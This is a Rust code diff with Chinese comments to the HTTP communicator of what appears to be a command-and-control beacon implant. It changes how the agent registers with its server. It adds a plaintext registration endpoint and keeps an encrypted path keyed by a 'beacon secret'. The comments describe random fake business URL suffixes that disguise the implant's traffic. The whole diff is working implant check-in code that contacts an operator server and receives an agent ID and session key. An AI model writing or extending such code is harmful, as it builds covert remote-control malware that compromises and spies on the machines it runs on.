@@ -84,9 +84,13 @@ impl HttpCommunicator {
         self.profile = Some(profile);
     }
 
+    /// 注册端点（注册时 entry_path 尚未切换为 profile 入口，即构建时 register_path）。
+    fn register_url(&self) -> String {
+        format!("{}{}", self.server_url, self.entry_path)
+    }
+
     /// 本次请求的完整 URL：入口前缀 + 随机虚假业务后缀（profile 配置）。
-    fn entry_url(&self) -> String {
-        let suffix = self
+    fn entry_url(&self) -> String {        let suffix = self
             .profile
             .as_ref()
             .and_then(|p| {
@@ -242,17 +246,26 @@ impl HttpCommunicator {
             if has_session_key { "true" } else { "false" }
         );
 
-        // 预会话密钥：无 beacon secret 时明文注册（兼容旧部署）
-        let (body, key_for_encrypt) = if beacon_secret.is_empty() {
-            let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
-            (self.build_body(&envelope, &[0u8; AES_KEY_SIZE]), None)
+        // 无 beacon secret（开发/明文部署环境）：走旧端点明文注册。
+        // 有 secret：走单入口密文注册（预会话密钥）。
+        let (status, resp_body) = if beacon_secret.is_empty() {
+            let resp = self
+                .client
+                .post(self.register_url())
+                .header("Content-Type", "application/json")
+                .body(reg_json.clone())
+                .send()
+                .await
+                .map_err(|e| e.to_string())?;
+            let status = resp.status().as_u16();
+            let text = resp.text().await.map_err(|e| e.to_string())?;
+            (status, text)
         } else {
             let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
             let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
-            (self.build_body(&envelope, &pre_key), Some(pre_key))
+            let body = self.build_body(&envelope, &pre_key);
+            self.post_envelope(body).await?
         };
-
-        let (status, resp_body) = self.post_envelope(body).await?;
         if status != 200 {
             return Err(format!("Registration failed with status: {status}"));
         }
@@ -302,7 +315,6 @@ impl HttpCommunicator {
             .and_then(|n| n.as_f64())
             .unwrap_or(0.0);
 
-        let _ = key_for_encrypt;
         Ok(RegisterOutcome {
             agent_id,
             session_key,
